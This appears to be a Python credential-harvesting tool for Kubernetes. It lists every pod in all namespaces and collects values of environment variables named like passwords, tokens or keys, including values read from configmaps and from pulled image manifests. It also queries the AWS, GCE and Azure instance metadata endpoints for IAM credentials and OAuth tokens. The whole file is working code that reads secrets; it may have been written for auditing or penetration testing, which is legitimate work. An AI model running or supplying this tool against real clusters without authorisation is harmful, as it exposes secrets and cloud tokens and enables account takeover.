#!/usr/bin/python

import os
from kubernetes import client, config
import requests
import docker
import logging
import argparse

class harvester():
    def __init__(self):
        if os.path.exists('/var/run/secrets/kubernetes.io'):
            config.load_incluster_config()
            self.current_namespace = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read()
        else:
            config.load_kube_config()
            try:
                self.current_namespace = config.list_kube_config_contexts()[1]['context']['namespace']
            except KeyError:
                logger.error('Your context does not contain a namespace, add a new contest or edit ~/.kube/config')
        self.core_client = client.CoreV1Api()
        self.all_pods = self.core_client.list_pod_for_all_namespaces()

    def get_pod_map_all_namespaces(self):
        pod_map = {}
        for pod in self.all_pods.items:
            tmp_pod_env = {}
            tmp_env = []
            for container in pod.spec.containers:
                if container.env:
                    for env in container.env:
                        tmp_env.append(env)
                raw_image = container.image
                try:
                    if ':' in raw_image:
                        image_name, image_version = raw_image.split(':')
                    else:
                        image_name = raw_image
                        image_version = None
                except ValueError:
                    continue
                tmp_pod_env[container.name] = ({'name': container.name, 'env': tmp_env, 'image': image_name, 'version': image_version})
            pod_map[pod.metadata.name] = {"namespace": pod.metadata.namespace, "containers": tmp_pod_env}
        return pod_map

    def parse_pod_map_for_creds(self, pod_map):
        credkey = ['pass', 'token', 'key']
        reported_issues = []
        for pod in pod_map:
            for container in pod_map[pod]['containers']:
                for env in pod_map[pod]['containers'][container]['env']:
                    for key in credkey:
                        if key in env.name.lower():
                            if env.value_from is None:
                                logger.issue('Found potential credential {0} in env of container {1} running in pod {2} in namespace {3}'.format(env.name, container, pod, pod_map[pod]['namespace']))
                                reported_issues.append({'name': env.name, 'value': env.value, 'container': container, 'pod': pod, 'namespace': pod_map[pod]['namespace'], 'key': key})
                            else:
                                if env.value_from.config_map_key_ref is None:
                                    continue
                                else:
                                    tmp_configmap = self.core_client.read_namespaced_config_map(env.value_from.config_map_key_ref.name, pod_map[pod]['namespace'])
                                    logger.issue('Found potential credential {0} in env configmap of container {1} running in pod {2} in namespace {3}'.format(env.value_from.config_map_key_ref.key, container, pod, pod_map[pod]['namespace']))
                                    reported_issues.append({'name': env.value_from.config_map_key_ref.key, 'value': tmp_configmap.data[env.value_from.config_map_key_ref.key], 'container': container, 'pod': pod, 'namespace': pod_map[pod]['namespace'], 'key': key})

                dockerclient = docker.APIClient()
                if pod_map[pod]['containers'][container]['version'] is None:
                    tmp_pullurl = pod_map[pod]['containers'][container]['image']
                else:
                    tmp_pullurl = '{0}:{1}'.format(pod_map[pod]['containers'][container]['image'], pod_map[pod]['containers'][container]['version'])

                try:
                    tmp_mainifest = dockerclient.inspect_image(tmp_pullurl)
                except docker.errors.ImageNotFound:
                    try:
                        logger.info('Trying to pull image {0} since it was not found when requesting manifest'.format(tmp_pullurl))
                        dockerclient.pull(pod_map[pod]['containers'][container]['image'], tag=pod_map[pod]['containers'][container]['version'])
                    except:
                        continue
                    tmp_mainifest = dockerclient.inspect_image(tmp_pullurl)
                for key in credkey:
                    for tmp_env in tmp_mainifest['ContainerConfig']['Env']:
                        if key in tmp_env.split('=')[0].lower():
                            reported_issues.append({'name': tmp_env.split('=')[0], 'value': tmp_env.split('=')[1], 'container': container, 'pod': pod, 'namespace': pod_map[pod]['namespace'], 'key': key})
                            logger.issue('Found a potential credential {0} in the manifest env of container {1} running in pod {2} in namespace {3}'.format(tmp_env.split('=')[0], container, pod, pod_map[pod]['namespace']))
        return reported_issues

    def try_to_gather_cloud_tokens(self):
        cloud_map = {}
        try:
            ra = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
            if ra.status_code == 200:
                logger.issue("Sucessfully got AWS metadata API iam data")
                cloud_map['aws'] = ra.text
        except requests.exceptions.ConnectionError:
            logger.info('Could not get internal metadata from aws')

        try:
            rg = requests.get('http://metadata/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor': 'Google'})
            if rg.status_code == 200:
                logger.issue("Sucessfully got GCE metadata API service account token")
                cloud_map['gce'] = rg.text
        except requests.exceptions.ConnectionError:
            logger.info('Could not get internal metadata from gce')

        try:
            rz = requests.get('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F', headers={'Metadata': 'true'})
            if rz.status_code == 200:
                logger.issue("Sucessfully got Azure metadata API oauth token")
                cloud_map['az'] = rz.text
        except requests.exceptions.ConnectionError:
            logger.info('Could not get internal metadata from Azure')
        return cloud_map


if __name__ == '__main__':
    # Parse out all of the command line arguments
    parser = argparse.ArgumentParser(description='Try to gather potential creds from kubernetes')
    parser.add_argument('-v', '--verbose', help='Whether or not to display additional log information', required=False, action='store_true')
    args = parser.parse_args()
    if args.verbose:
        logging.basicConfig(level=logging.INFO, format='[%(levelname)s]: %(message)s')
    else:
        logging.basicConfig(format='[%(levelname)s]: %(message)s')
    logging.ISSUE = 35
    logging.addLevelName(logging.ISSUE, 'ISSUE')
    logger = logging.getLogger()
    setattr(logger, 'issue', lambda message, *args: logger._log(logging.ISSUE, message, args))
    new_harvester = harvester()
    pod_map = new_harvester.get_pod_map_all_namespaces()
    reported_issues = new_harvester.parse_pod_map_for_creds(pod_map)
    cloud_map = new_harvester.try_to_gather_cloud_tokens()
    logger.info('Harvester completed with {0} potential credentials identified'.format(len(reported_issues) + len(cloud_map)))
